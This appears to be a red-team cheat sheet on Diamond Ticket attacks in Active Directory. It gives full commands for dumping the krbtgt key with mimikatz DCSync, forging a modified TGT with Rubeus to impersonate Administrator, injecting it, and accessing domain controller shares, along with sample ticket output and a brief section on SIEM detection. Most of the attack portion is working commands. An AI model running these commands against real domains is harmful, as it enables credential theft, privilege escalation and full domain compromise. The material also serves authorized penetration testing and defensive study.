
A Diamond Ticket is an advanced Kerberos technique where you modify a real, legitimate TGT already issued by the KDC and present in memory in order to impersonate another user such as `Administrator`. Unlike a Golden Ticket, it does not start from a fully forged ticket. Because it is based on a genuine TGT signed by the KDC, the result looks more realistic, reduces cryptographic anomalies, and can evade detections aimed at fully forged tickets. The only hard requirement is a valid TGT in memory, obtained through any legitimate or abused path. Since the ticket contains valid fields such as timestamps, checksums, and PAC data originating from the normal KDC issuance flow, it tends to blend in better than a pure Golden or Silver Ticket.

- [ ] Limitations

- It does not persist across reboot.
- Some services validate PAC content more strictly.
- It may not always work well for LDAP clients depending on how authentication is performed.

- [ ] Detection and General OPSEC for Forged Tickets

- Original PAC fields such as `LogonTime` can reveal the manipulation.
- SIEM correlation between logons and issued TGS/TGT events can expose duration anomalies or inconsistent PAC fields.
- Suggested SIEM logic:
  - Silver: `4624` on the target host without a prior `4769` for that user/service
  - Golden: `4769` without a prior `4768`, unusually long duration, odd group/SID makeup

- [ ] Verifying TGT Content After Building a Diamond Ticket

```powershell
# Describe the original ticket
.\Rubeus.exe describe /servicekey:KRBTGT_HASH /ticket:

UserName          : user
UserId            : 1001
Groups            : 1106,513
ExtraSIDs         : S-1-18-1
Sid               : S-1-5-21-3926355307-1661546229-813047887-1001
LogonDomainName   : DOMAIN
LogonServer       : HOST
FullName          : common user

# Describe the modified ticket
Rubeus.exe describe /servicekey:KRBTGT_HASH /ticket:

UserName          : Administrator
UserId            : 500
Groups            : 520,512,513,519,518
ExtraSIDs         : S-1-18-1
Sid               : S-1-5-21-3926355307-1661546229-813047887-500
LogonDomainName   : DOMAIN
LogonServer       : HOST
FullName          : common user
```

> Even when `UserName`, `UserId`, and `Groups` are modified correctly, fields such as `FullName` or `LogonCount` may preserve information from the original ticket and expose tampering.

- [ ] Requirements

```powershell
# 1. High-integrity privileges

# 2. Target user to impersonate via /ticketuser + /ticketuserid (RID)

# 3. FQDN and SID of the domain
ldapsearch (objectClass=domain) --attributes objectSid

# 4. KRBTGT key of the source domain (AES preferred, NTLM also works)
.\mimikatz.exe "privilge::debug" "token:elevate" "lsadump::dcsync /domain:source.domain /user:source\krbtgt" "exit"

# 5. A real, valid TGT in memory (krbtgt/DOMAIN)
.\Rubeus.exe triage
# Service : krbtgt/SOURCE.DOMAIN
```

- [ ] With `/tgtdeleg`

> If you impersonate another user such as `ada` rather than `Administrator`, specify `/sid`, `/ticketuserid`, and `/groups` explicitly to model the intended security context.

```powershell
# Administrator
.\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sid:SID_DOMAIN /groups:512 /enctype:aes /krbkey:KRBTGT_HASH_SOURCE_DOMAIN_AES /domain:domain.local /dc:dc01.domain.local /createnetonly:C:\Windows\System32\cmd.exe /nowrap /ptt

# Another user
.\Rubeus.exe diamond /tgtdeleg /ticketuser:ada /ticketuserid:1001 /sid:SID_DOMAIN /groups:512 /enctype:aes /krbkey:KRBTGT_HASH_SOURCE_DOMAIN_AES /domain:domain.local /dc:dc01.domain.local /createnetonly:C:\Windows\System32\cmd.exe /nowrap /ptt

# Describe the loaded ticket
.\Rubeus.exe describe /ticket:

run klist
# Client: Administrator @ SOURCE.DOMAIN
# Server: krbtgt/SOURCE.DOMAIN @ SOURCE.DOMAIN

# Use the ticket as Admin
ls \\dc01\c$
ls \\db01\c$
```

- `/createnetonly:C:\Windows\System32\cmd.exe`: creates a netonly process (LogonType 9) where the ticket is used only for network authentication.
- `/enctype:aes`: forces AES usage for the ticket/key material.
- `/tgtdeleg`: extracts a legitimate TGT from the current Kerberos context through GSS-API delegation behavior and uses it as the base template.
- `/krbkey`: KRBTGT key used to sign/validate the ticket.
- `/ticketuser`: user to impersonate inside the final ticket.
- `/ticketuserid`: RID of that impersonated user.
- `/domain`: target domain name.
- `/sid`: base SID of the domain.
- `/groups`: RID list to simulate in the PAC.
- `/servicekey`: key used to decrypt and inspect ticket internals.

- [ ] With Credentials (Alternative to `/tgtdeleg`)

In a Diamond Ticket workflow, `/user` and `/password` are only used to obtain the initial legitimate TGT. The identity finally represented in the forged ticket is still controlled by `/ticketuser`, `/ticketuserid`, and `/groups`.

```powershell
Rubeus.exe diamond /krbkey:KRBTGT_HASH_SOURCE_DOMAIN_AES /user:ada /password:adapss! /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /domain:domain.local /dc:dc01.domain.local /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```
